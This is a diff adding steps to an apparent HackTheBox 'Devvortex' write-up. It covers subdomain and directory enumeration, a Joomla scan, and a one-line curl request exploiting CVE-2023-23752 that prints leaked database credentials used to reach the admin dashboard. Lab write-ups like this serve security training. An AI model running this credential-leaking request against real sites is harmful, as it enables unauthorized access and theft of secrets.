@@ -45,3 +45,96 @@ Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
 3. Adding the domain name in our `/etc/hosts` file.
 	- ![](Assets/Pasted%20image%2020250313183443.png)
 
+4. This is the website running in the 80 port.
+	![](Assets/Pasted%20image%2020250320033427.png)
+
+5. During subdomain enumeration, I discovered `dev.devvortex.htb`.
+	![](Assets/Pasted%20image%2020250320033021.png)
+	- I then updated the `/etc/hosts` file to include this new subdomain. Upon visiting `dev.devvortex.htb`, I noticed that the website appeared different from the main domain.
+
+6. After the directory enumeration on the new sub-domain, i found a few of status 200 which indicate success and lots of status 403 which mean access to the following resources were forbidden.
+	- ![](Assets/Pasted%20image%2020250320040449.png)
+	- Here are all the directory name of status code 200 with size. Among it, i found `/robots.txt` interesting as it might contain other hidden directories. Robot.txt is the page containing instruction for bot, like web crawler, which web page to access and not to access.
+		```
+		/index.php            (Status: 200) [Size: 23221]
+		/LICENSE.txt          (Status: 200) [Size: 18092]
+		/robots.txt           (Status: 200) [Size: 764]
+		/.                    (Status: 200) [Size: 23221]
+		/configuration.php    (Status: 200) [Size: 0]
+		/README.txt           (Status: 200) [Size: 4942]
+		/htaccess.txt         (Status: 200) [Size: 6858]
+		```
+
+7. I then visited the `robot.txt` directory and know that it is running Zoomla CMS (Content Management System). Then i ran zoomscan, a zoomla vulnerability scanner, on the site, which detected the version name `4.2.6`. A google search reveal that, the version is vulnerable to improper access check leading to unauthorised access (CVE-2023-23752). 
+	```
+	
+	[+] FireWall Detector
+	[++] Firewall not detected
+	
+	[+] Detecting Joomla Version
+	[++] Joomla 4.2.6
+	
+	[+] Core Joomla Vulnerability
+	[++] Target Joomla core is not vulnerable
+	
+	[+] Checking apache info/status files
+	[++] Readable info/status files are not found
+	
+	[+] admin finder
+	[++] Admin page : http://dev.devvortex.htb/administrator/
+	
+	[+] Checking robots.txt existing
+	[++] robots.txt is found
+	path : http://dev.devvortex.htb/robots.txt 
+	
+	Interesting path found from robots.txt
+	http://dev.devvortex.htb/joomla/administrator/
+	http://dev.devvortex.htb/administrator/
+	http://dev.devvortex.htb/api/
+	http://dev.devvortex.htb/bin/
+	http://dev.devvortex.htb/cache/
+	http://dev.devvortex.htb/cli/
+	http://dev.devvortex.htb/components/
+	http://dev.devvortex.htb/includes/
+	http://dev.devvortex.htb/installation/
+	http://dev.devvortex.htb/language/
+	http://dev.devvortex.htb/layouts/
+	http://dev.devvortex.htb/libraries/
+	http://dev.devvortex.htb/logs/
+	http://dev.devvortex.htb/modules/
+	http://dev.devvortex.htb/plugins/
+	http://dev.devvortex.htb/tmp/
+	
+	
+	[+] Finding common backup files name
+	[++] Backup files are not found
+	
+	[+] Finding common log files name
+	[++] error log is not found
+	
+	[+] Checking sensitive config.php.x file
+	[++] Readable config files are not found
+	```
+
+8. Exploiting the vulnerability, I got the user credential.
+```
+	curl  http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
+```
+`{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},`
+
+- Then i logged in to `/administrator/index.php` with the credential and got access to the administrator dashboard.
+- ![](Assets/Pasted%20image%2020250320053843.png)
+- ![](Assets/Pasted%20image%2020250320053911.png)
+
+
+
+
+
+
+
+
+
+https://iammr0ot.github.io/posts/devvortex/
+
+
+https://medium.com/@aniketdas07770/hackthebox-devvortex-writeup-b6fa1f007dff
